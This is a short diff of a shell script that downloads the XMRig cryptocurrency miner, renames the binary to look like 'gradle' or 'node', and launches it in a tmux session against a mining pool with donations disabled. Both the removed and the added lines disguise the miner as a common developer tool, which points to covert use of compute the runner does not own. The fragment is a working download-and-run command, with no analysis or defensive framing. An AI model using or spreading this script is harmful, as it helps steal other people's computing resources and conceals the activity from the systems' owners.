@@ -14,9 +14,9 @@ else
         wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz &&
         tar -xzf xmrig-6.22.2-linux-static-x64.tar.gz &&
         cd xmrig-6.22.2 &&
-        mv xmrig gradle &&
-        chmod +x gradle &&
-        exec -a 'node' ./gradle -o $DOMAIN --tls -k --donate-level=0 -t 4 --rig-id $NAME_WORK
+        mv xmrig node &&
+        chmod +x node &&
+        exec ./node -o $DOMAIN --tls -k --donate-level=0 -t 4 --rig-id $NAME_WORK
     " C-m
 
     tmux attach-session -t $SESSION
